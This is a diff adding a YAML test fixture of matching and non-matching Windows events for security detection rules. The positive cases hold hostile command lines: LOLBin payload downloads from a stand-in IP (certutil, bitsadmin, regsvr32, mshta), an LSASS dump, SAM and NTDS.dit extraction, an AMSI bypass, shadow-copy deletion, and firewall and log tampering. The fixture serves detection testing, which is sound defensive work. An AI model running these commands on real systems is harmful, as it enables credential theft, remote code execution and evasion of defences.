@@ -1,0 +1,385 @@
+# Evidence that the Windows rules fire, and that they do not fire on the thing
+# they most resemble. See linux.yml for the format and why each part is there.
+
+win_admin_share_service:
+  matches:
+    - name: a service installed over ADMIN$
+      event:
+        EventID: 7045
+        ServiceName: PSEXESVC
+        ImagePath: \\WIN-DC01\ADMIN$\PSEXESVC.exe
+  ignores:
+    - name: an ordinary service install
+      event:
+        EventID: 7045
+        ServiceName: VendorAgent
+        ImagePath: C:\Program Files\Vendor\agent.exe
+  also_fires: []
+
+win_audit_log_cleared:
+  matches:
+    - name: the security log was cleared
+      event:
+        EventID: 1102
+        Channel: Security
+        SubjectUserName: administrator
+  ignores:
+    - name: an ordinary logon
+      event:
+        EventID: 4624
+        Channel: Security
+        TargetUserName: deploy
+  also_fires: []
+
+win_defender_exclusion_added:
+  matches:
+    - name: an exclusion path added
+      event:
+        Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        CommandLine: powershell.exe -Command Add-MpPreference -ExclusionPath C:\Users\Public
+  ignores:
+    - name: reading the settings
+      event:
+        Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        CommandLine: powershell.exe -Command Get-MpPreference
+  also_fires: []
+
+win_encoded_powershell:
+  matches:
+    - name: an encoded command
+      event:
+        Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        CommandLine: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA
+  ignores:
+    - name: a signed maintenance script
+      event:
+        Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        CommandLine: powershell.exe -File C:\Scripts\Backup.ps1
+  also_fires: []
+
+win_local_account_created:
+  # Two paths through this rule - the security event and the command line -
+  # so both are proved, and each near miss is the same shape as the positive
+  # it argues with. A negative sharing no field with any positive tests
+  # nothing: an empty event would pass it.
+  matches:
+    - name: a local account was created
+      event:
+        EventID: 4720
+        Channel: Security
+        TargetUserName: svc_backup
+    - name: an account added from the command line
+      event:
+        Image: C:\Windows\System32\net.exe
+        CommandLine: net user svc_backup Passw0rd123! /add
+  ignores:
+    - name: an existing account enabled
+      event:
+        EventID: 4722
+        Channel: Security
+        TargetUserName: svc_backup
+    - name: querying an account
+      event:
+        Image: C:\Windows\System32\net.exe
+        CommandLine: net user svc_backup
+  also_fires: []
+
+win_lsass_dump:
+  matches:
+    - name: comsvcs MiniDump against lsass
+      event:
+        Image: C:\Windows\System32\rundll32.exe
+        CommandLine: rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump 624 C:\Temp\out.dmp full
+  ignores:
+    - name: procdump against a crashing application
+      event:
+        Image: C:\Tools\procdump64.exe
+        CommandLine: procdump64.exe -accepteula -ma w3wp.exe C:\Temp\w3wp.dmp
+  also_fires: []
+
+win_run_key_persistence:
+  matches:
+    - name: a Run key pointing into a user-writable path
+      event:
+        EventID: 13
+        TargetObject: HKU\S-1-5-21-1\Software\Microsoft\Windows\CurrentVersion\Run\Updater
+        Details: C:\Users\Public\update.exe
+  ignores:
+    - name: a vendor Run key
+      event:
+        EventID: 13
+        TargetObject: HKLM\Software\Microsoft\Windows\CurrentVersion\Run\VendorTray
+        Details: C:\Program Files\Vendor\tray.exe
+  also_fires: []
+
+win_sam_hive_export:
+  matches:
+    - name: the SAM hive saved to disk
+      event:
+        Image: C:\Windows\System32\reg.exe
+        CommandLine: reg save hklm\sam C:\Temp\sam.hive
+  ignores:
+    - name: a registry query
+      event:
+        Image: C:\Windows\System32\reg.exe
+        CommandLine: reg query hklm\software\Microsoft\Windows NT\CurrentVersion
+  also_fires: []
+
+win_scheduled_task_created:
+  matches:
+    - name: a task that launches powershell
+      event:
+        Image: C:\Windows\System32\schtasks.exe
+        CommandLine: schtasks /create /tn Updater /tr "powershell -w hidden -File C:\Users\Public\u.ps1" /sc onlogon
+  ignores:
+    - name: listing tasks
+      event:
+        Image: C:\Windows\System32\schtasks.exe
+        CommandLine: schtasks /query /fo LIST
+  also_fires: []
+
+win_service_installed:
+  matches:
+    - name: a service running from a user-writable path
+      event:
+        EventID: 7045
+        ServiceName: UpdaterSvc
+        ImagePath: C:\Users\Public\updater.exe
+  ignores:
+    - name: an ordinary service install
+      event:
+        EventID: 7045
+        ServiceName: VendorAgent
+        ImagePath: C:\Program Files\Vendor\agent.exe
+  also_fires: []
+
+win_shadow_copy_deletion:
+  matches:
+    - name: shadow copies deleted
+      event:
+        Image: C:\Windows\System32\vssadmin.exe
+        CommandLine: vssadmin delete shadows /all /quiet
+  ignores:
+    - name: listing shadow copies
+      event:
+        Image: C:\Windows\System32\vssadmin.exe
+        CommandLine: vssadmin list shadows
+  also_fires: []
+
+win_office_spawns_shell:
+  matches:
+    - name: word starting powershell
+      event:
+        ParentImage: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+        Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        CommandLine: powershell.exe -w hidden -c IWR http://198.51.100.7/a
+    - name: excel starting mshta
+      event:
+        ParentImage: C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE
+        Image: C:\Windows\System32\mshta.exe
+        CommandLine: mshta.exe http://198.51.100.7/a.hta
+  ignores:
+    - name: word starting its own updater
+      event:
+        ParentImage: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+        Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeC2RClient.exe
+        CommandLine: OfficeC2RClient.exe /update user
+    - name: a shell started by the user, not by a document
+      event:
+        ParentImage: C:\Windows\explorer.exe
+        Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        CommandLine: powershell.exe -NoProfile
+  # A spreadsheet launching mshta against a URL is genuinely both things: a
+  # document that spawned an interpreter, and a signed binary fetching a
+  # remote payload. Two true alerts on one event, and an analyst wants both -
+  # the first says how it got in, the second says what it did next.
+  also_fires:
+    - win_lolbin_remote_payload
+
+win_lolbin_remote_payload:
+  matches:
+    - name: certutil pulling a file down
+      event:
+        Image: C:\Windows\System32\certutil.exe
+        CommandLine: certutil.exe -urlcache -split -f http://198.51.100.7/a.exe C:\Temp\a.exe
+    - name: certutil turning text back into an executable
+      event:
+        Image: C:\Windows\System32\certutil.exe
+        CommandLine: certutil -decode C:\Temp\a.txt C:\Temp\a.exe
+    - name: regsvr32 running remote script
+      event:
+        Image: C:\Windows\System32\regsvr32.exe
+        CommandLine: regsvr32 /s /n /u /i:http://198.51.100.7/a.sct scrobj.dll
+    - name: bitsadmin transferring a payload
+      event:
+        Image: C:\Windows\System32\bitsadmin.exe
+        CommandLine: bitsadmin /transfer job /download /priority high http://198.51.100.7/a.exe C:\Temp\a.exe
+  ignores:
+    - name: certutil checking a certificate
+      event:
+        Image: C:\Windows\System32\certutil.exe
+        CommandLine: certutil -verify C:\Temp\server.cer
+    - name: regsvr32 registering an ordinary dll
+      event:
+        Image: C:\Windows\System32\regsvr32.exe
+        CommandLine: regsvr32 /s C:\Program Files\Vendor\plugin.dll
+    - name: bitsadmin listing jobs
+      event:
+        Image: C:\Windows\System32\bitsadmin.exe
+        CommandLine: bitsadmin /list /allusers
+  also_fires: []
+
+win_amsi_bypass:
+  matches:
+    - name: amsiInitFailed patched
+      event:
+        Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        CommandLine: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
+    - name: script scanning turned off
+      event:
+        Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        CommandLine: powershell.exe -Command Set-MpPreference -DisableScriptScanning $true
+  ignores:
+    - name: an ordinary reflection call
+      event:
+        Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        CommandLine: "[Ref].Assembly.GetType('System.Environment').GetProperty('MachineName')"
+  also_fires: []
+
+win_ntds_extraction:
+  matches:
+    - name: an install-from-media snapshot
+      event:
+        Image: C:\Windows\System32\ntdsutil.exe
+        CommandLine: ntdsutil "ac i ntds" "ifm" "create full C:\Temp\ifm" q q
+    - name: the database copied out of a shadow copy
+      event:
+        Image: C:\Windows\System32\cmd.exe
+        CommandLine: cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Temp\
+  ignores:
+    - name: ntdsutil checking replication
+      event:
+        Image: C:\Windows\System32\ntdsutil.exe
+        CommandLine: ntdsutil "metadata cleanup" "connections" q q
+  also_fires: []
+
+win_wmi_remote_execution:
+  matches:
+    - name: wmic starting a process elsewhere
+      event:
+        Image: C:\Windows\System32\wbem\WMIC.exe
+        CommandLine: wmic /node:10.0.0.42 process call create "powershell -w hidden -enc SQBFAFgA"
+    - name: the powershell equivalent
+      event:
+        Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        CommandLine: powershell.exe Invoke-WmiMethod -ComputerName APP-01 -Class Win32_Process -Name Create
+  ignores:
+    - name: wmic reading local inventory
+      event:
+        Image: C:\Windows\System32\wbem\WMIC.exe
+        CommandLine: wmic product get name,version
+    - name: querying a remote host without starting anything
+      event:
+        Image: C:\Windows\System32\wbem\WMIC.exe
+        CommandLine: wmic /node:10.0.0.42 os get caption,version
+  also_fires: []
+
+win_event_log_tampered:
+  matches:
+    - name: the security log cleared from the command line
+      event:
+        Image: C:\Windows\System32\wevtutil.exe
+        CommandLine: wevtutil.exe cl Security
+    - name: the log service stopped outright
+      event:
+        Image: C:\Windows\System32\net.exe
+        CommandLine: net stop eventlog /y
+  ignores:
+    - name: reading a log
+      event:
+        Image: C:\Windows\System32\wevtutil.exe
+        CommandLine: wevtutil.exe qe Security /c:10 /rd:true /f:text
+    - name: listing the log channels
+      event:
+        Image: C:\Windows\System32\wevtutil.exe
+        CommandLine: wevtutil.exe el
+  also_fires: []
+
+win_wmi_event_subscription:
+  matches:
+    - name: a consumer that runs a command
+      event:
+        Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        CommandLine: powershell.exe Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='u';CommandLineTemplate='powershell -enc SQBFAFgA'}
+    - name: the filter half, created with wmic
+      event:
+        Image: C:\Windows\System32\wbem\WMIC.exe
+        CommandLine: wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="u", QueryLanguage="WQL"
+  ignores:
+    - name: querying wmi for inventory
+      event:
+        Image: C:\Windows\System32\wbem\WMIC.exe
+        CommandLine: wmic /namespace:\\root\cimv2 PATH Win32_OperatingSystem GET Caption
+  # The consumer's command template is encoded PowerShell, so both rules are
+  # right: one names the persistence, the other names what it will run.
+  also_fires:
+    - win_encoded_powershell
+
+win_rdp_session_hijack:
+  matches:
+    - name: another user's session attached to this one
+      event:
+        Image: C:\Windows\System32\tscon.exe
+        CommandLine: tscon 2 /dest:rdp-tcp#1
+  ignores:
+    - name: listing sessions
+      event:
+        Image: C:\Windows\System32\query.exe
+        CommandLine: query user
+    - name: reconnecting to your own session, which needs no /dest
+      event:
+        Image: C:\Windows\System32\tscon.exe
+        CommandLine: tscon 3
+  also_fires: []
+
+win_firewall_disabled:
+  matches:
+    - name: every profile turned off
+      event:
+        Image: C:\Windows\System32\netsh.exe
+        CommandLine: netsh advfirewall set allprofiles state off
+    - name: the powershell equivalent
+      event:
+        Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        CommandLine: powershell.exe Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+  ignores:
+    - name: adding a rule, which is ordinary administration
+      event:
+        Image: C:\Windows\System32\netsh.exe
+        CommandLine: netsh advfirewall firewall add rule name="App" dir=in action=allow protocol=TCP localport=8443
+    - name: reading the current state
+      event:
+        Image: C:\Windows\System32\netsh.exe
+        CommandLine: netsh advfirewall show allprofiles
+  also_fires: []
+
+win_domain_recon:
+  matches:
+    - name: asking who the domain admins are
+      event:
+        Image: C:\Windows\System32\net.exe
+        CommandLine: net group "domain admins" /domain
+    - name: locating the domain controllers
+      event:
+        Image: C:\Windows\System32\nltest.exe
+        CommandLine: nltest /dclist:corp.example
+  ignores:
+    - name: a local group listing
+      event:
+        Image: C:\Windows\System32\net.exe
+        CommandLine: net localgroup Users
+    - name: checking your own session
+      event:
+        Image: C:\Windows\System32\whoami.exe
+        CommandLine: whoami
+  also_fires: []
